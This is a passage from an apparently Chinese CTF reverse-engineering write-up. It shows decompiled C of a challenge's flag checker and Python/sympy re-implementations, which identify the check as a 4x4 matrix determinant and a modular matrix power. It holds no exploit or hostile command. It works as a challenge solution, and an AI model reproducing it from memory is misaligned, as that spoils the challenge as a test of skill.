= tag1;</span><br><span class="line">v70 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;v74 + tag1 - *(_OWORD *)&amp;v70;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v78 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;v82 + *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v85 = *(_OWORD *)&amp;<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1) * v34;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">v83 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">v85 = *(_OWORD *)&amp;count + tag1 - *(_OWORD *)&amp;v83;</span><br><span class="line">tag1_1 = tag1;</span><br><span class="line">count = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line"><span class="keyword">if</span> ( *(_OWORD *)&amp;count == <span class="number">0</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>其中所用到的辅助函数是128位的mod运算，简化后是：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b2nle</span>(<span class="params">b, n</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(b[i:i+n], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), n)]</span><br><span class="line"></span><br><span class="line">cnts = [<span class="number">0xdc37c0e304978087</span>, <span class="number">0x594b7f91f11228e5</span>, </span><br><span class="line">        <span class="number">0x264f1c2a310e43aa</span>, <span class="number">0x06f62577ddb8f7c8</span>, <span class="number">0x2f5eef5c62186c64</span>, <span class="number">0x3b278b1ea0e08e88</span>, </span><br><span class="line">        <span class="number">0x030b6b0678e48aee</span>, <span class="number">0x5857a70651b71bd1</span>, <span class="number">0x11328681bbf8806a</span>, <span class="number">0x46a52df6f08b2685</span>, </span><br><span class="line">        <span class="number">0x5b5746a4910ca7fd</span>, <span class="number">0x04fce2f265662e21</span>, <span class="number">0x32a013dc0e0f538a</span>, <span class="number">0xfffec7ae2c6f8f79</span>, </span><br><span class="line">        <span class="number">0x3b0ad6e24be21f00</span>, <span class="number">0xd285721394b26b6f</span>, <span class="number">0x49ff24112a0c1a2e</span>, <span class="number">0xf3a55fbbc4837e78</span>, </span><br><span class="line"></span><br><span class="line">        <span class="number">0x65de31ef76b34c5e</span>, <span class="number">0xbf9224aa780960ba</span>, <span class="number">0x944c61fe664d8a46</span>, <span class="number">0x85ffaacd31f816d1</span>, </span><br><span class="line">        <span class="number">0x5fe739de69b61b49</span>, <span class="number">0x4362ab9dfd8274e5</span>, <span class="number">0xc90b9e6ac29a84ec</span>, <span class="number">0x661807122a7615d7</span>, </span><br><span class="line">        <span class="number">0x2367a1bf2b936d7c</span>, <span class="number">0x289e160527983def</span>, <span class="number">0xb0e4b274464c4bfd</span>, <span class="number">0x5222046dfef7b826</span>, </span><br><span class="line">        <span class="number">0x6158769ed8530622</span>, <span class="number">0x056eabd584b51a70</span>, <span class="number">0xa5b7c08151fface8</span>, <span class="number">0xc7b8d0a6d71a6e00</span>]</span><br><span class="line"></span><br><span class="line">mode = cnts[<span class="number">0</span>]</span><br><span class="line">mcnt = cnts[<span class="number">2</span>:<span class="number">18</span>]</span><br><span class="line">inp = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;ffac071f3fabda20d4f3a936840a1f9bf05e3650f645479145b99f6219357939&quot;</span>)</span><br><span class="line"></span><br><span class="line">qinp = b2nle(inp, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    mcnt[i] ^= qinp[i%<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> mcnt[i] &gt; mode: <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>); exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">tag = <span class="number">0</span></span><br><span class="line">out1 = mcnt[<span class="number">0xF</span>] * mcnt[<span class="number">0xA</span>] * mcnt[<span class="number">0x5</span>]</span><br><span class="line">out2 = mcnt[<span class="number">0xD</span>] * mcnt[<span class="number">0xB</span>] * mcnt[<span class="number">0x6</span>]</span><br><span class="line">out3 = mcnt[<span class="number">0xE</span>] * mcnt[<span class="number">0x9</span>] * mcnt[<span class="number">0x7</span>]</span><br><span class="line">out4 = mcnt[<span class="number">0x7</span>] * mcnt[<span class="number">0xA</span>] * mcnt[<span class="number">0xD</span>]</span><br><span class="line">out5 = mcnt[<span class="number">0x5</span>] * mcnt[<span class="number">0xB</span>] * mcnt[<span class="number">0xE</span>]</span><br><span class="line">out6 = mcnt[<span class="number">0x6</span>] * mcnt[<span class="number">0x9</span>] * mcnt[<span class="number">0xF</span>]</span><br><span class="line">tag += (out1 + out2 + out3 - out4 - out5 - out6) * mcnt[<span class="number">0x0</span>]</span><br><span class="line">out1 = mcnt[<span class="number">0xF</span>] * mcnt[<span class="number">0xA</span>] * mcnt[<span class="number">0x4</span>]</span><br><span class="line">out2 = mcnt[<span class="number">0xC</span>] * mcnt[<span class="number">0xB</span>] * mcnt[<span class="number">0x6</span>]</span><br><span class="line">out3 = mcnt[<span class="number">0xE</span>] * mcnt[<span class="number">0x8</span>] * mcnt[<span class="number">0x7</span>]</span><br><span class="line">out4 = mcnt[<span class="number">0x7</span>] * mcnt[<span class="number">0xA</span>] * mcnt[<span class="number">0xC</span>]</span><br><span class="line">out5 = mcnt[<span class="number">0x4</span>] * mcnt[<span class="number">0xB</span>] * mcnt[<span class="number">0xE</span>]</span><br><span class="line">out6 = mcnt[<span class="number">0x6</span>] * mcnt[<span class="number">0x8</span>] * mcnt[<span class="number">0xF</span>]</span><br><span class="line">tag -= (out1 + out2 + out3 - out4 - out5 - out6) * mcnt[<span class="number">0x1</span>]</span><br><span class="line">out1 = mcnt[<span class="number">0xF</span>] * mcnt[<span class="number">0x9</span>] * mcnt[<span class="number">0x4</span>]</span><br><span class="line">out2 = mcnt[<span class="number">0xC</span>] * mcnt[<span class="number">0xB</span>] * mcnt[<span class="number">0x5</span>]</span><br><span class="line">out3 = mcnt[<span class="number">0xD</span>] * mcnt[<span class="number">0x8</span>] * mcnt[<span class="number">0x7</span>]</span><br><span class="line">out4 = mcnt[<span class="number">0x7</span>] * mcnt[<span class="number">0x9</span>] * mcnt[<span class="number">0xC</span>]</span><br><span class="line">out5 = mcnt[<span class="number">0x4</span>] * mcnt[<span class="number">0xB</span>] * mcnt[<span class="number">0xD</span>]</span><br><span class="line">out6 = mcnt[<span class="number">0x5</span>] * mcnt[<span class="number">0x8</span>] * mcnt[<span class="number">0xF</span>]</span><br><span class="line">tag += (out1 + out2 + out3 - out4 - out5 - out6) * mcnt[<span class="number">0x2</span>]</span><br><span class="line">out1 = mcnt[<span class="number">0xE</span>] * mcnt[<span class="number">0x9</span>] * mcnt[<span class="number">0x4</span>]</span><br><span class="line">out2 = mcnt[<span class="number">0xC</span>] * mcnt[<span class="number">0xA</span>] * mcnt[<span class="number">0x5</span>]</span><br><span class="line">out3 = mcnt[<span class="number">0xD</span>] * mcnt[<span class="number">0x8</span>] * mcnt[<span class="number">0x6</span>]</span><br><span class="line">out4 = mcnt[<span class="number">0x6</span>] * mcnt[<span class="number">0x9</span>] * mcnt[<span class="number">0xC</span>]</span><br><span class="line">out5 = mcnt[<span class="number">0x4</span>] * mcnt[<span class="number">0xA</span>] * mcnt[<span class="number">0xD</span>]</span><br><span class="line">out6 = mcnt[<span class="number">0x5</span>] * mcnt[<span class="number">0x8</span>] * mcnt[<span class="number">0xE</span>]</span><br><span class="line">tag -= (out1 + out2 + out3 - out4 - out5 - out6) * mcnt[<span class="number">0x3</span>]</span><br><span class="line">tag %= mode</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tag))</span><br></pre></td></tr></table></figure>

<p>但实际上这是在求mcnt这个矩阵的行列式并证明其线性无关，因此可以进一步简化：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b2nle</span>(<span class="params">b, n</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(b[i:i+n], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), n)]</span><br><span class="line"></span><br><span class="line">cnts = [<span class="number">0xdc37c0e304978087</span>, <span class="number">0x594b7f91f11228e5</span>, </span><br><span class="line">        <span class="number">0x264f1c2a310e43aa</span>, <span class="number">0x06f62577ddb8f7c8</span>, <span class="number">0x2f5eef5c62186c64</span>, <span class="number">0x3b278b1ea0e08e88</span>, </span><br><span class="line">        <span class="number">0x030b6b0678e48aee</span>, <span class="number">0x5857a70651b71bd1</span>, <span class="number">0x11328681bbf8806a</span>, <span class="number">0x46a52df6f08b2685</span>, </span><br><span class="line">        <span class="number">0x5b5746a4910ca7fd</span>, <span class="number">0x04fce2f265662e21</span>, <span class="number">0x32a013dc0e0f538a</span>, <span class="number">0xfffec7ae2c6f8f79</span>, </span><br><span class="line">        <span class="number">0x3b0ad6e24be21f00</span>, <span class="number">0xd285721394b26b6f</span>, <span class="number">0x49ff24112a0c1a2e</span>, <span class="number">0xf3a55fbbc4837e78</span>, </span><br><span class="line"></span><br><span class="line">        <span class="number">0x65de31ef76b34c5e</span>, <span class="number">0xbf9224aa780960ba</span>, <span class="number">0x944c61fe664d8a46</span>, <span class="number">0x85ffaacd31f816d1</span>, </span><br><span class="line">        <span class="number">0x5fe739de69b61b49</span>, <span class="number">0x4362ab9dfd8274e5</span>, <span class="number">0xc90b9e6ac29a84ec</span>, <span class="number">0x661807122a7615d7</span>, </span><br><span class="line">        <span class="number">0x2367a1bf2b936d7c</span>, <span class="number">0x289e160527983def</span>, <span class="number">0xb0e4b274464c4bfd</span>, <span class="number">0x5222046dfef7b826</span>, </span><br><span class="line">        <span class="number">0x6158769ed8530622</span>, <span class="number">0x056eabd584b51a70</span>, <span class="number">0xa5b7c08151fface8</span>, <span class="number">0xc7b8d0a6d71a6e00</span>]</span><br><span class="line"></span><br><span class="line">mode = cnts[<span class="number">0</span>]</span><br><span class="line">mcnt = cnts[<span class="number">2</span>:<span class="number">18</span>]</span><br><span class="line">inp = <span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;ffac071f3fabda20d4f3a936840a1f9bf05e3650f645479145b99f6219357939&quot;</span>)</span><br><span class="line">qinp = b2nle(inp, <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    mcnt[i] ^= qinp[i%<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">if</span> mcnt[i] &gt; mode: <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>); exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">M = Matrix([mcnt[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>)])</span><br><span class="line">tag = <span class="built_in">int</span>(M.det() % mode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tag))</span><br></pre></td></tr></table></figure>

<p>最后面的部分：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">  v88[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v88[<span class="number">1</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  v88[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v88[<span class="number">11</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  v88[<span class="number">20</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v88[<span class="number">21</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  v88[<span class="number">30</span>] = <span class="number">1</span>;</span><br><span class="line">  v88[<span class="number">31</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf_, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf_));</span><br><span class="line">  <span class="keyword">for</span> ( n15_1 = <span class="number">0</span>; n15_1 &lt;= <span class="number">15</span>; ++n15_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v42 = *((_QWORD *)&amp;enc[n15_1 + <span class="number">64</span>] + <span class="number">1</span>);</span><br><span class="line">    v43 = &amp;enc[n15_1 + <span class="number">32</span>];</span><br><span class="line">    *(_QWORD *)v43 = *(_QWORD *)&amp;enc[n15_1 + <span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)v43 + <span class="number">1</span>) = v42;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n63 = <span class="number">0</span>; n63 &lt;= <span class="number">63</span>; ++n63 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (tag2 &gt;&gt; n63) &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( n3_2 = <span class="number">0</span>; n3_2 &lt;= <span class="number">3</span>; ++n3_2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( n3_1 = <span class="number">0</span>; n3_1 &lt;= <span class="number">3</span>; ++n3_1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v44 = &amp;enc[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1];</span><br><span class="line">          *(_QWORD *)v44 = <span class="number">0</span>;</span><br><span class="line">          *((_QWORD *)v44 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span> ( n3 = <span class="number">0</span>; n3 &lt;= <span class="number">3</span>; ++n3 )</span><br><span class="line">          &#123;</span><br><span class="line">            v45 = *(_QWORD *)&amp;enc[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1];</span><br><span class="line">            v46 = *((_QWORD *)&amp;enc[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1] + <span class="number">1</span>);</span><br><span class="line">            v47 = *(_QWORD *)&amp;enc[<span class="number">4</span> * n3_2 + <span class="number">48</span> + n3];</span><br><span class="line">            v48 = *(_QWORD *)&amp;enc[<span class="number">4</span> * n3 + <span class="number">32</span> + n3_1];</span><br><span class="line">            v49 = v48 * *((_QWORD *)&amp;enc[<span class="number">4</span> * n3_2 + <span class="number">48</span> + n3] + <span class="number">1</span>) + v47 * *((_QWORD *)&amp;enc[<span class="number">4</span> * n3 + <span class="number">32</span> + n3_1] + <span class="number">1</span>);</span><br><span class="line">            v50 = v48 * (<span class="type">unsigned</span> __int128)v47;</span><br><span class="line">            *((_QWORD *)&amp;v50 + <span class="number">1</span>) += v49;</span><br><span class="line">            v85 = v50;</span><br><span class="line">            tag1_1 = tag1;</span><br><span class="line">            v51 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">            *(_QWORD *)&amp;v52 = v45;</span><br><span class="line">            *((_QWORD *)&amp;v52 + <span class="number">1</span>) = v46;</span><br><span class="line">            enc[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1] = *(_OWORD *)&amp;v51 + v52;</span><br><span class="line">            <span class="built_in">LODWORD</span>(v45) = <span class="number">4</span> * n3_2 + n3_1;</span><br><span class="line">            v85 = enc[(<span class="type">int</span>)v45 + <span class="number">16</span>];</span><br><span class="line">            tag1_1 = tag1;</span><br><span class="line">            enc[(<span class="type">int</span>)v45 + <span class="number">16</span>] = (__int128)<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( n15_2 = <span class="number">0</span>; n15_2 &lt;= <span class="number">15</span>; ++n15_2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v53 = *((_QWORD *)&amp;enc[n15_2 + <span class="number">16</span>] + <span class="number">1</span>);</span><br><span class="line">        v54 = &amp;enc[n15_2 + <span class="number">48</span>];</span><br><span class="line">        *(_QWORD *)v54 = *(_QWORD *)&amp;enc[n15_2 + <span class="number">16</span>];</span><br><span class="line">        *((_QWORD *)v54 + <span class="number">1</span>) = v53;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n3_5 = <span class="number">0</span>; n3_5 &lt;= <span class="number">3</span>; ++n3_5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( n3_4 = <span class="number">0</span>; n3_4 &lt;= <span class="number">3</span>; ++n3_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v55 = &amp;enc[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4];</span><br><span class="line">        *(_QWORD *)v55 = <span class="number">0</span>;</span><br><span class="line">        *((_QWORD *)v55 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( n3_3 = <span class="number">0</span>; n3_3 &lt;= <span class="number">3</span>; ++n3_3 )</span><br><span class="line">        &#123;</span><br><span class="line">          v56 = *(_QWORD *)&amp;enc[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4];</span><br><span class="line">          v57 = *((_QWORD *)&amp;enc[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4] + <span class="number">1</span>);</span><br><span class="line">          v58 = *(_QWORD *)&amp;enc[<span class="number">4</span> * n3_5 + <span class="number">32</span> + n3_3];</span><br><span class="line">          v59 = *(_QWORD *)&amp;enc[<span class="number">4</span> * n3_3 + <span class="number">32</span> + n3_4];</span><br><span class="line">          v60 = v59 * *((_QWORD *)&amp;enc[<span class="number">4</span> * n3_5 + <span class="number">32</span> + n3_3] + <span class="number">1</span>) + v58 * *((_QWORD *)&amp;enc[<span class="number">4</span> * n3_3 + <span class="number">32</span> + n3_4] + <span class="number">1</span>);</span><br><span class="line">          v61 = v59 * (<span class="type">unsigned</span> __int128)v58;</span><br><span class="line">          *((_QWORD *)&amp;v61 + <span class="number">1</span>) += v60;</span><br><span class="line">          v85 = v61;</span><br><span class="line">          tag1_1 = tag1;</span><br><span class="line">          v62 = <span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">          *(_QWORD *)&amp;v63 = v56;</span><br><span class="line">          *((_QWORD *)&amp;v63 + <span class="number">1</span>) = v57;</span><br><span class="line">          enc[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4] = *(_OWORD *)&amp;v62 + v63;</span><br><span class="line">          <span class="built_in">LODWORD</span>(v56) = <span class="number">4</span> * n3_5 + n3_4;</span><br><span class="line">          v85 = enc[(<span class="type">int</span>)v56 + <span class="number">16</span>];</span><br><span class="line">          tag1_1 = tag1;</span><br><span class="line">          enc[(<span class="type">int</span>)v56 + <span class="number">16</span>] = (__int128)<span class="built_in">mod</span>((<span class="type">unsigned</span> __int64 *)&amp;v85, (<span class="type">unsigned</span> __int64 *)&amp;tag1_1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n15_3 = <span class="number">0</span>; n15_3 &lt;= <span class="number">15</span>; ++n15_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v64 = *((_QWORD *)&amp;enc[n15_3 + <span class="number">16</span>] + <span class="number">1</span>);</span><br><span class="line">      v65 = &amp;enc[n15_3 + <span class="number">32</span>];</span><br><span class="line">      *(_QWORD *)v65 = *(_QWORD *)&amp;enc[n15_3 + <span class="number">16</span>];</span><br><span class="line">      *((_QWORD *)v65 + <span class="number">1</span>) = v64;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  enc[<span class="number">0</span>] = <span class="number">0x65DE31EF76B34C5EuLL</span>;</span><br><span class="line">  enc[<span class="number">1</span>] = <span class="number">0xBF9224AA780960BAuLL</span>;</span><br><span class="line">  enc[<span class="number">2</span>] = <span class="number">0x944C61FE664D8A46uLL</span>;</span><br><span class="line">  enc[<span class="number">3</span>] = <span class="number">0x85FFAACD31F816D1uLL</span>;</span><br><span class="line">  enc[<span class="number">4</span>] = <span class="number">0x5FE739DE69B61B49uLL</span>;</span><br><span class="line">  enc[<span class="number">5</span>] = <span class="number">0x4362AB9DFD8274E5uLL</span>;</span><br><span class="line">  enc[<span class="number">6</span>] = <span class="number">0xC90B9E6AC29A84ECuLL</span>;</span><br><span class="line">  enc[<span class="number">7</span>] = <span class="number">0x661807122A7615D7uLL</span>;</span><br><span class="line">  enc[<span class="number">8</span>] = <span class="number">0x2367A1BF2B936D7CuLL</span>;</span><br><span class="line">  enc[<span class="number">9</span>] = <span class="number">0x289E160527983DEFuLL</span>;</span><br><span class="line">  enc[<span class="number">10</span>] = <span class="number">0xB0E4B274464C4BFDuLL</span>;</span><br><span class="line">  enc[<span class="number">11</span>] = <span class="number">0x5222046DFEF7B826uLL</span>;</span><br><span class="line">  enc[<span class="number">12</span>] = <span class="number">0x6158769ED8530622uLL</span>;</span><br><span class="line">  enc[<span class="number">13</span>] = <span class="number">0x56EABD584B51A70uLL</span>;</span><br><span class="line">  enc[<span class="number">14</span>] = <span class="number">0xA5B7C08151FFACE8uLL</span>;</span><br><span class="line">  enc[<span class="number">15</span>] = <span class="number">0xC7B8D0A6D71A6E00uLL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)((__int64 (__fastcall *)(__int128 *, _QWORD *, __int64))unk_268936AF608)(enc, v88, <span class="number">256</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分很简单，注意到这是刚刚的4×4矩阵在tag1整数环上的tag2次幂的快速幂计算，直接同构就行，完整同构：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b2nle</span>(<span class="params">b, n</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(b[i:i+n], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">n2ble</span>(<span class="params">na, n</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> a <span 